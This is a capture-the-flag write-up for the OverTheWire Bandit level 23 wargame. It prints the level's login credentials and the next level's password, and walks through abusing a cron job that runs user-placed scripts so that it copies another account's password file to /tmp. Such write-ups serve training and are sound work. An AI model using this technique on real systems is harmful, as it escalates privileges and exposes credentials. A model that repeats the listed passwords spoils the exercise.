# OverTheWire Bandit Level 23

## Credentials
username: bandit23
password: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

## Writeup
I was once again directed to the crontab directory. The cronjob for level24 runs a shell script with the following code.

```
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

I have to create a shell script and place it in /var/spool/bandit24/foo for it to be executed. The cronjob for bandit24 will run the script every minute.

This is the shell script I used:

```
#!/bin/bash

cat /etc/bandit_pass/bandit24
```

The terminal command which I used is shown below. I first set the `+H` flag which disables `! style history substitution`. The `-e` switch on echo tells the command to read newlines.

`echo -e "cat /etc/bandit_pass/bandit24 > /tmp/asdfjkl1234" > /var/spool/bandit24/foo/zzz.sh && chmod +x /var/spool/bandit24/foo/zzz.sh`

After the file was executed, I was able to obtain the flag by catting `/tmp/asdfjkl1234`.

## Flag
Level 24 Password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
